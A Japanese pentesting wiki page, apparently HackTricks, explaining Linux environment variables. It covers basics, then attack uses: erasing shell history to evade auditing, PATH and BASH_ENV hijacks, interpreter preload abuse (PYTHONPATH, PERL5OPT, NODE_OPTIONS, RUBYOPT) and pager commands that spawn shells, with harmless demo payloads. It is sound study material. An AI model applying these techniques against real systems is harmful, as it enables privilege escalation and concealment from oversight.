# Linux 環境変数

## グローバル変数

グローバル変数は**子プロセス**に継承されます。

次のようにして、現在のセッション用のグローバル変数を作成できます。
```bash
export MYGLOBAL="hello world"
echo $MYGLOBAL #Prints: hello world
```
この変数は、現在のセッションとその子プロセスからアクセスできます。

次のように変数を**削除**できます：
```bash
unset MYGLOBAL
```
## ローカル変数

**ローカル変数**は、**現在の shell/script**からのみ**アクセス**できます。
```bash
LOCAL="my local"
echo $LOCAL
unset LOCAL
```
## 現在の変数を一覧表示
```bash
set
env
printenv
cat /proc/$$/environ
cat /proc/`python -c "import os; print(os.getppid())"`/environ
```
`/proc/*/environ` の内容は **NUL-separated** なので、通常は次のバリアントのほうが読みやすくなります：
```bash
tr '\0' '\n' </proc/$$/environ | sort -u
tr '\0' '\n' </proc/<PID>/environ | sort -u
```
**credentials** または継承された環境内の**興味深いサービス設定**を探している場合は、[Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md) も確認してください。

## 共通変数

出典: [https://geek-university.com/linux/common-environment-variables/](https://geek-university.com/linux/common-environment-variables/)。<sup>[[5]](#references)</sup>

- **DISPLAY** – **X** が使用するディスプレイ。この変数は通常 **:0.0** に設定され、現在のコンピューターの最初のディスプレイを意味します。
- **EDITOR** – ユーザーが優先するテキストエディター。
- **HISTFILESIZE** – history file に含められる行数の最大値。
- **HISTSIZE** – ユーザーがセッションを終了したときに history file に追加される行数。
- **HOME** – ホームディレクトリ。
- **HOSTNAME** – コンピューターのホスト名。
- **LANG** – 現在の言語。
- **MAIL** – ユーザーの mail spool の場所。通常は **/var/spool/mail/USER**。
- **MANPATH** – manual pages を検索するディレクトリの一覧。
- **OSTYPE** – オペレーティングシステムの種類。
- **PS1** – bash のデフォルトプロンプト。
- **PATH** – 実行したい binary files を保持するすべてのディレクトリのパスを格納します。ファイルの相対パスまたは絶対パスを指定せず、ファイル名だけを指定して実行できます。
- **PWD** – 現在の working directory。
- **SHELL** – 現在の command shell へのパス（例: **/bin/bash**）。
- **TERM** – 現在の terminal type（例: **xterm**）。
- **TZ** – タイムゾーン。
- **USER** – 現在の username。

## hacking に興味深い変数

すべての変数が同じ程度に役立つわけではありません。offensive の観点では、**search paths**、**startup files**、**dynamic linker の動作**、または**audit/logging**を変更する変数を優先してください。

### **HISTFILESIZE**

**この変数の値を 0 に変更**すると、**セッションを終了した**ときに**history file** (\~/.bash_history) が**0 行に truncate**されます。
```bash
export HISTFILESIZE=0
```
### **HISTSIZE**

**この変数の値を 0 に変更**すると、コマンドが**メモリ内の履歴に保持されなくなり**、**履歴ファイル**（\~/.bash_history）にも書き戻されなくなります。
```bash
export HISTSIZE=0
```
### **HISTCONTROL**

**この変数の値が `ignorespace` または `ignoreboth` に設定されている場合**、先頭に余分なスペースを付けたコマンドは履歴に保存されません。
```bash
export HISTCONTROL=ignorespace
```

```bash
$ echo "to save or"
$  echo "not to save"
```
### **HISTFILE**

**履歴ファイル**を**`/dev/null`**に設定するか、完全に設定解除します。通常、履歴サイズを変更するだけよりも信頼性が高くなります。
```bash
export HISTFILE=/dev/null
unset HISTFILE
```
### http_proxy & https_proxy

プロセスは、ここで宣言された **proxy** を使用して、**http または https** 経由でインターネットに接続します。
```bash
export http_proxy="http://10.10.10.10:8080"
export https_proxy="http://10.10.10.10:8080"
```
### all_proxy & no_proxy

- `all_proxy`: これを尊重する tools/protocols のデフォルト proxy。
- `no_proxy`: 直接接続すべき bypass list（hosts/domains/CIDRs）。
```bash
export all_proxy="socks5h://10.10.10.10:1080"
export no_proxy="localhost,127.0.0.1,.corp.local,10.0.0.0/8"
```
ツールに応じて、小文字と大文字のどちらの形式も使用される場合があります（`http_proxy`/`HTTP_PROXY`、`no_proxy`/`NO_PROXY`）。

### SSL_CERT_FILE & SSL_CERT_DIR

プロセスは、**これらの環境変数**で指定された証明書を信頼します。これは、**`curl`**、**`git`**、Python HTTPクライアント、パッケージマネージャーなどのツールに、攻撃者が管理するCAを信頼させる場合に便利です（例えば、interception proxyを正規のものに見せかけるため）。
```bash
export SSL_CERT_FILE=/path/to/ca-bundle.pem
export SSL_CERT_DIR=/path/to/ca-certificates
```
### **PATH**

特権 wrapper/script が**絶対パスを使わずに**コマンドを実行する場合、**攻撃者が制御できる最初のディレクトリ**が `PATH` 内で優先されます。これは、`sudo`、cron jobs、shell wrappers、カスタム SUID helpers における多くの **PATH hijacks** の基盤となる primitive です。`env_keep+=PATH`、弱い `secure_path`、または `tar`、`service`、`cp`、`python` などを名前だけで呼び出す wrappers を探してください。
```bash
mkdir -p /dev/shm/bin
cat > /dev/shm/bin/tar <<'EOF'
#!/bin/sh
echo '[+] PATH hijack reached' >&2
id
EOF
chmod +x /dev/shm/bin/tar
PATH=/dev/shm/bin:$PATH vulnerable-wrapper
```
完全な `PATH` 悪用による privilege-escalation chain については、[Linux Privilege Escalation](linux-privilege-escalation/README.md) を確認してください。

### **HOME & XDG_CONFIG_HOME**

`HOME` は単なるディレクトリ参照ではありません。多くのツールは、`$HOME` または `$XDG_CONFIG_HOME` から **dotfiles**、**plugins**、**per-user configuration** を自動的に読み込みます。特権ワークフローがこれらの値を保持している場合、**config injection** は binary hijacking よりも容易になる可能性があります。
```bash
export HOME=/dev/shm/fakehome
export XDG_CONFIG_HOME=/dev/shm/fakehome/.config
mkdir -p "$XDG_CONFIG_HOME"
```
興味深い対象には、`.gitconfig`、`.wgetrc`、`.curlrc`、`.inputrc`、`.pythonrc.py`、および `.terraformrc` などの tool-specific files が含まれます。

### **LD_PRELOAD, LD_LIBRARY_PATH & LD_AUDIT**

これらの変数は **dynamic linker** に影響します。

- `LD_PRELOAD`: 追加の shared objects を最初にロードするよう強制します。
- `LD_LIBRARY_PATH`: library search directories を先頭に追加します。
- `LD_AUDIT`: library loading と symbol resolution を監視する auditor libraries をロードします。

特権コマンドがこれらを保持する場合、これらは **hooking**、**instrumentation**、および **privilege escalation** に非常に有用です。**secure-execution** モード（`AT_SECURE`、例: setuid/setgid/capabilities）では、loader がこれらの変数の多くを削除または制限します。ただし、この early loader stage で発生する parser bugs は、対象プログラムよりも**前**に実行されるため、依然として影響が大きくなります。<sup>[[2]](#references)</sup>
```bash
env | grep -E '^LD_'
ldso=$(ls /lib64/ld-linux-*.so.* /lib/*-linux-gnu/ld-linux-*.so.* 2>/dev/null | head -n1)
"$ldso" --list-diagnostics /bin/true | head
"$ldso" --list-tunables /bin/true | head
```
### **GLIBC_TUNABLES**

`GLIBC_TUNABLES` は glibc の初期動作（allocator tunables など）を変更するため、exploit labs で非常に便利です。セキュリティの観点でも重要です。これは **dynamic loader が非常に早い段階で解析する** ためです。2023 年の **Looney Tunables** バグは、loader で解析される 1 つの環境変数が、SUID programs に対する **local privilege-escalation primitive** になり得ることを改めて示しました。<sup>[[6]](#references)</sup>
```bash
GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary
```
### **BASH_ENV & ENV**

**Bash** が **non-interactively** 起動された場合、対象の script を実行する前に `BASH_ENV` を確認し、そのファイルを source します。Bash が `sh` として呼び出された場合、または POSIX-style の interactive mode では、`ENV` も参照されることがあります。これは、environment が attacker-controlled の場合に、shell wrapper を code execution に変える classic な方法です。
```bash
cat > /tmp/pre.sh <<'EOF'
echo '[+] sourced before the target script'
EOF
BASH_ENV=/tmp/pre.sh bash -c 'echo target'
```
Bashは**real/effective IDsが異なる**場合、これらのstartup filesを無視します。`-p`はeffective IDを保持しますが、これらのstartup filesを有効にはしないため、正確な動作はwrapperがshellをどのように起動するかによって異なります。Bashを起動する**前に**`setuid()`/`setgid()`を呼び出すprivileged wrapperには注意してください。IDsが再び一致すると、Bashは、通常なら無視する`BASH_ENV`、`ENV`、および関連するshell stateを信頼する可能性があります。<sup>[[1]](#references)</sup>

### **PYTHONPATH, PYTHONHOME, PYTHONSTARTUP & PYTHONINSPECT**

これらのvariablesはPythonの起動方法を変更します。

- `PYTHONPATH`: import search pathsをprependする。
- `PYTHONHOME`: standard library treeをrelocateする。
- `PYTHONSTARTUP`: interactive promptの前にfileをexecuteする。
- `PYTHONINSPECT=1`: scriptの終了後にinteractive modeへ移行する。

これらは、制御可能なenvironmentを使ってPythonを呼び出すmaintenance scripts、debuggers、shells、wrappersに対して有効です。`python -E`と`python -I`は、すべての`PYTHON*` variablesを無視します。
```bash
mkdir -p /tmp/pylib
printf 'print("owned from PYTHONPATH")\n' > /tmp/pylib/htmod.py
PYTHONPATH=/tmp/pylib python3 -c 'import htmod'
PYTHONPATH=/tmp/pylib python3 -I -c 'import htmod'   # ignored in isolated mode
```
最近の実例として、Ubuntu/Debian システムにおける 2024 年の **needrestart** LPE があります。root 所有の scanner が `/proc/<PID>/environ` から非特権プロセスの `PYTHONPATH` をコピーし、その後 Python を実行していました。公開された exploit では、攻撃者が制御する path に `importlib/__init__.so` を配置したため、helper にハードコードされた script が問題になる前に、Python 自身の初期化中に攻撃者の code が実行されました。<sup>[[3]](#references)</sup>

### **PERL5OPT & PERL5LIB**

Perl には、同様に有用な startup variables があります。

- `PERL5LIB`: library directories を prepend する。
- `PERL5OPT`: すべての `perl` command line に指定されているかのように switches を inject する。

これにより、target script が処理を開始する前に **automatic module loading** を強制したり、interpreter の動作を変更したりできます。Perl は **taint / setuid / setgid** context ではこれらの variables を無視しますが、通常の root-run wrappers、CI jobs、installers、custom sudoers rules では依然として非常に重要です。
```bash
mkdir -p /tmp/perllib
cat > /tmp/perllib/HT.pm <<'EOF'
package HT;
BEGIN { print "PERL5OPT_TRIGGERED\n" }
1;
EOF
PERL5LIB=/tmp/perllib PERL5OPT=-MHT perl -e 'print "target\n"'
```
### **NODE_OPTIONS**

`NODE_OPTIONS` は、環境を継承するすべての `node` プロセスに **Node.js CLI flags** を追加します。そのため、最終的に Node を実行する wrappers、CI jobs、Electron helpers、sudo rules に対して有用です。攻撃時に特に興味深い flags は通常、次のとおりです。

- `--require <file>`: 対象スクリプトの前に CommonJS file を preload します。
- `--import <module>`: 対象スクリプトの前に ES module を preload します。

Node は `NODE_OPTIONS` 内の一部の危険な flags を拒否しますが、`--require` と `--import` は明示的に許可されており、通常の command-line arguments より**前に**処理されます。<sup>[[4]](#references)</sup>
```bash
cat > /tmp/preload.js <<'EOF'
console.error('[+] NODE_OPTIONS preload reached')
EOF
NODE_OPTIONS='--require /tmp/preload.js' node -e 'console.log("target")'
```
remote gadget chains が `NODE_OPTIONS` を間接的に設定する場合（例: prototype-pollution から RCE）、[こちらのページ](../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.md)を確認してください。

### **RUBYLIB & RUBYOPT**

Ruby でも同様の startup abuse が可能です。

- `RUBYLIB`: Ruby の load path の先頭にディレクトリを追加します。
- `RUBYOPT`: すべての `ruby` invocation に `-r` などのコマンドラインオプションを注入します。
```bash
mkdir -p /tmp/rubylib
printf 'warn "[+] RUBYOPT preload reached"\n' > /tmp/rubylib/ht.rb
RUBYLIB=/tmp/rubylib RUBYOPT='-rht' ruby -e 'puts :target'
```
2024年の**needrestart**の脆弱性は、これが単なる lab trick ではないことを示しました。`PYTHONPATH` abuse に対して脆弱だった同じ root-owned helper を、attacker-controlled な `RUBYLIB` を使って Ruby を実行し、attacker directory から `enc/encdb.so` を読み込むよう強制することも可能でした。<sup>[[3]](#references)</sup>

### **PAGER, MANPAGER, GIT_PAGER, GIT_EDITOR & LESSOPEN**

一部のツールは、環境変数から path を読み取るだけではなく、その値を **shell**、**editor**、または **input preprocessor** に渡します。そのため、privileged wrapper が `git`、`man`、`less`、または同様の text viewer を実行する場合、次の変数は特に注目すべき対象になります。

- `PAGER`、`MANPAGER`、`GIT_PAGER`: pager command を選択します。
- `GIT_EDITOR`、`VISUAL`、`EDITOR`: editor command を選択します。多くの場合、arguments も指定できます。
- `LESSOPEN`、`LESSCLOSE`: `less` が file を開く際に実行される pre/post-processors を定義します。
```bash
PAGER='sh -c "exec sh 0<&1 1>&1"' man man

cat > /tmp/lesspipe.sh <<'EOF'
#!/bin/sh
echo '[+] LESSOPEN triggered' >&2
cat "$1"
EOF
chmod +x /tmp/lesspipe.sh
LESSOPEN='|/tmp/lesspipe.sh %s' less /etc/hosts
```
Git は、`GIT_CONFIG_COUNT`、`GIT_CONFIG_KEY_<n>`、`GIT_CONFIG_VALUE_<n>` を使用して、ディスクに触れずに **env-only config injection** もサポートしています。
```bash
GIT_CONFIG_COUNT=1 \
GIT_CONFIG_KEY_0=core.pager \
GIT_CONFIG_VALUE_0='sh -c "exec sh 0<&1 1>&1"' \
git -p help
```
ポストエクスプロイテーションの観点では、継承された環境に **credentials**、**proxy settings**、**service tokens**、または **cloud keys** が含まれていることも忘れないでください。[Linux Post Exploitation](../post-exploitation/linux-post-exploitation/README.md) で、`/proc/<PID>/environ` および `systemd` の `Environment=` の探索を確認してください。

### PS1

プロンプトの表示方法を変更します。

[**これは一例です**](https://gist.github.com/carlospolop/43f7cd50f3deea972439af3222b68808)

Root:

![PERL5OPT & PERL5LIB - PS1: これは一例です](<../images/image (897).png>)

通常のユーザー:

![PERL5OPT & PERL5LIB - PS1: バックグラウンドで実行中のジョブが1つ、2つ、3つ](<../images/image (740).png>)

バックグラウンドで実行中のジョブが1つ、2つ、3つ:

![PERL5OPT & PERL5LIB - PS1: バックグラウンドで実行中のジョブが1つ、2つ、3つ](<../images/image (145).png>)

バックグラウンドジョブが1つ、停止中のジョブが1つ、最後のコマンドが正常に終了しなかった場合:

![PERL5OPT & PERL5LIB - PS1: バックグラウンドジョブが1つ、停止中のジョブが1つ、最後のコマンドが正常に終了しなかった場合](<../images/image (715).png>)

## References

- [1] [GNU Bash Manual - Bash Startup Files](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html)
- [2] [ld.so(8) - Linux マニュアルページ](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [3] [Qualys - needrestart における LPE](https://www.qualys.com/2024/11/19/needrestart/needrestart.txt)
- [4] [Node.js CLI ドキュメント - `NODE_OPTIONS`](https://nodejs.org/api/cli.html)
- [5] [一般的な環境変数 - Geek University](https://geek-university.com/linux/common-environment-variables/)
- [6] [CVE-2023-4911: Looney Tunables - glibc の ld.so における Local Privilege Escalation - Qualys](https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so)
{{#include ../../banners/hacktricks-training.md}}
